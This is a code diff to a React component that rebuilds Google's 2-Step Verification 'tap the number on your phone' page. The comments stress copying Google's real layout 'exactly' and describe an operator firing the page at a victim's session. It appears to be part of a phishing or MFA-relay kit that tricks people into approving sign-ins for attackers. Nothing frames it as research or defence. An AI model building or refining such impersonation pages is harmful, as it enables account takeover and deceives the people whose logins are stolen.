@@ -50,114 +50,139 @@ const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ provide
   // own theme so the experience is consistent if the operator ever fires
   // this command for a non-Gmail session.
   // Real Google "Trying to sign in?" / 2-Step Verification number-prompt
-  // page is a single, narrow centered card (~ 450px) with the Google logo
-  // at the top, the account chip, a small "Check your <device>" header,
-  // the prominent number, instructions, and a "Yes" / "No, it's not me"
-  // pair. We mirror that layout here exactly for Gmail; non-Gmail
-  // providers (rare for this flow) reuse the same single-column layout
-  // but in their own theme so the chrome stays consistent.
+  // page is a wide two-column card on desktop: left column has the Google
+  // logo, "2-Step Verification" header, intro copy and the account chip;
+  // right column shows a phone illustration with the prompted number
+  // displayed inside it, plus a "Don't see your phone?" / "Try another
+  // way" link. On mobile the columns stack. We mirror that layout here
+  // exactly for Gmail (the canonical case); non-Gmail providers reuse the
+  // same layout in their own theme so the chrome stays consistent if the
+  // operator ever fires this command for a non-Gmail session.
   return (
     <div className={`min-h-screen flex flex-col font-sans ${theme.backgroundClass}`} style={{ fontFamily: theme.fontFamily }}>
-      <main className="flex-grow w-full flex items-start justify-center p-4 pt-12 md:pt-20">
+      <main className="flex-grow w-full flex items-center justify-center p-4">
         <div
-          className="w-full max-w-[450px] mx-auto bg-white rounded-[28px] px-8 md:px-10 py-10"
+          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-8 md:px-14 py-10 md:py-12"
           style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
         >
-          {/* Top: provider logo + account chip — same chrome real Google uses */}
-          <div className="flex flex-col items-center">
-            <ProviderLogo providerKey={providerKey} className="h-9 w-9" />
-            {email && (
-              <div className="mt-4">
+          <div className="flex flex-col md:flex-row md:gap-16">
+            {/* Left column — Google logo, headline, intro, account chip */}
+            <div className="md:w-1/2 md:pt-4">
+              <ProviderLogo providerKey={providerKey} className="h-10 w-10" />
+              <h1 className="text-[28px] md:text-[36px] leading-tight font-normal text-gray-900 mt-8">
+                2-Step Verification
+              </h1>
+              <p className="text-[15px] leading-6 text-gray-700 mt-4 max-w-md">
+                A sign-in attempt requires further verification. To finish signing in, follow the instructions on your {deviceName}.
+              </p>
+              {email && (
+                <div className="mt-6">
+                  <button
+                    type="button"
+                    className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
+                    aria-label={email}
+                  >
+                    <div
+                      className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-semibold"
+                      style={{ backgroundColor: theme.primary }}
+                    >
+                      {email.charAt(0).toUpperCase()}
+                    </div>
+                    <span className="text-sm text-gray-800 pr-1">{email}</span>
+                    <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true">
+                      <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
+                    </svg>
+                  </button>
+                </div>
+              )}
+            </div>
+
+            {/* Right column — phone illustration with the prompted number,
+                instructions, and the "Try another way" / "It wasn't me"
+                actions. The phone outline is drawn with SVG so it renders
+                identically to Google's phone mockup. */}
+            <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col items-center">
+              <p className="text-[15px] leading-6 text-gray-800 self-start">
+                Open your <strong>{appName[providerKey]}</strong> app on {deviceName}. Tap{' '}
+                <strong>Yes</strong> on the prompt, then tap the number below.
+              </p>
+
+              <div className="relative mt-6 flex justify-center" aria-hidden="true">
+                <svg width="180" height="270" viewBox="0 0 180 270" xmlns="http://www.w3.org/2000/svg">
+                  {/* Phone body */}
+                  <rect x="10" y="6" width="160" height="258" rx="22" ry="22"
+                        fill="#fff" stroke="#dadce0" strokeWidth="2" />
+                  {/* Speaker */}
+                  <rect x="74" y="20" width="32" height="4" rx="2" fill="#dadce0" />
+                  {/* Screen */}
+                  <rect x="22" y="36" width="136" height="200" rx="6" fill="#f8f9fa" />
+                  {/* Notification card */}
+                  <rect x="32" y="56" width="116" height="62" rx="8" fill="#fff" stroke="#dadce0" />
+                  <circle cx="46" cy="72" r="6" fill={theme.primary} />
+                  <rect x="58" y="68" width="50" height="4" rx="2" fill="#5f6368" />
+                  <rect x="58" y="78" width="74" height="3" rx="1.5" fill="#9aa0a6" />
+                  <rect x="40" y="94" width="80" height="4" rx="2" fill="#3c4043" />
+                  <rect x="40" y="104" width="60" height="3" rx="1.5" fill="#9aa0a6" />
+                  {/* Big number badge inside the phone screen */}
+                  <rect x="46" y="140" width="88" height="58" rx="14" fill={theme.primaryLight} />
+                </svg>
+                <div
+                  className="absolute select-none"
+                  style={{
+                    top: '160px',
+                    left: '50%',
+                    transform: 'translateX(-50%)',
+                    color: theme.primary,
+                    fontSize: '34px',
+                    lineHeight: '1',
+                    fontWeight: 500,
+                    letterSpacing: '0.04em',
+                  }}
+                  aria-label={`Verification number ${number}`}
+                >
+                  {number || '--'}
+                </div>
+              </div>
+
+              <div className="flex items-center justify-center mt-6">
+                <svg
+                  className="animate-spin h-5 w-5 mr-2"
+                  style={{ color: theme.primary }}
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  aria-hidden="true"
+                >
+                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
+                  <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
+                </svg>
+                <span className="text-sm text-gray-700">Waiting for you to tap on your phone&hellip;</span>
+              </div>
+
+              <div className="flex justify-between items-center w-full mt-10">
                 <button
                   type="button"
-                  className="inline-flex items-center space-x-2 pl-1 pr-3 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
+                  onClick={handleNotMe}
+                  className="text-sm font-semibold hover:underline"
+                  style={{ color: theme.primary }}
                 >
-                  <div
-                    className="w-6 h-6 rounded-full flex items-center justify-center text-white text-[11px] font-semibold"
-                    style={{ backgroundColor: theme.primary }}
-                  >
-                    {email.charAt(0).toUpperCase()}
-                  </div>
-                  <span className="text-[13px] text-gray-800">{email}</span>
-                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true">
-                    <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
-                  </svg>
+                  No, it&rsquo;s not me
+                </button>
+                <button
+                  type="button"
+                  onClick={handleTryAnother}
+                  className="text-sm font-semibold hover:underline"
+                  style={{ color: theme.primary }}
+                >
+                  Try another way
                 </button>
               </div>
-            )}
-          </div>
-
-          {/* Title — matches real Google copy */}
-          <h1 className="text-[24px] leading-7 font-normal text-gray-900 text-center mt-8">
-            Trying to sign in?
-          </h1>
-          <p className="text-[14px] leading-5 text-gray-700 text-center mt-3">
-            Check your <strong>{deviceName}</strong> for a notification from{' '}
-            <strong>{appName[providerKey]}</strong>, and tap the number you see below to sign in.
-          </p>
-
-          {/* Big number in a rounded badge — Google's pill */}
-          <div className="mt-8 flex justify-center">
-            <div
-              className="rounded-full px-10 py-3 select-none"
-              style={{
-                backgroundColor: theme.primaryLight,
-                color: theme.primary,
-                fontSize: '40px',
-                lineHeight: '1.1',
-                fontWeight: 500,
-                letterSpacing: '0.04em',
-                minWidth: '120px',
-                textAlign: 'center',
-              }}
-              aria-label={`Verification number ${number}`}
-            >
-              {number || '--'}
             </div>
-          </div>
-
-          {/* Waiting indicator */}
-          <div className="flex items-center justify-center mt-6">
-            <svg
-              className="animate-spin h-4 w-4 mr-2"
-              style={{ color: theme.primary }}
-              viewBox="0 0 24 24"
-              fill="none"
-              aria-hidden="true"
-            >
-              <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
-              <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
-            </svg>
-            <span className="text-[13px] text-gray-600">Waiting&hellip;</span>
-          </div>
-
-          {/* Bottom actions — real Google shows "No, it's not me" + "Yes, it's me".
-              Our auth flow uses the operator-driven prompt so we keep the same
-              copy and labels but route the deny path to the standard
-              `deny_authenticator` action. */}
-          <div className="flex justify-between items-center mt-10">
-            <button
-              type="button"
-              onClick={handleNotMe}
-              className="text-sm font-semibold hover:underline"
-              style={{ color: theme.primary }}
-            >
-              No, it&rsquo;s not me
-            </button>
-            <button
-              type="button"
-              onClick={handleTryAnother}
-              className="text-sm font-semibold hover:underline"
-              style={{ color: theme.primary }}
-            >
-              Try another way
-            </button>
           </div>
         </div>
       </main>
 
       {providerKey === 'gmail' && (
-        <footer className="w-full max-w-[450px] mx-auto flex justify-end items-center px-4 py-6 text-xs text-gray-700">
+        <footer className="w-full max-w-[960px] mx-auto flex justify-end items-center px-4 py-6 text-xs text-gray-700">
           <div className="flex items-center space-x-4">
             <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
             <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
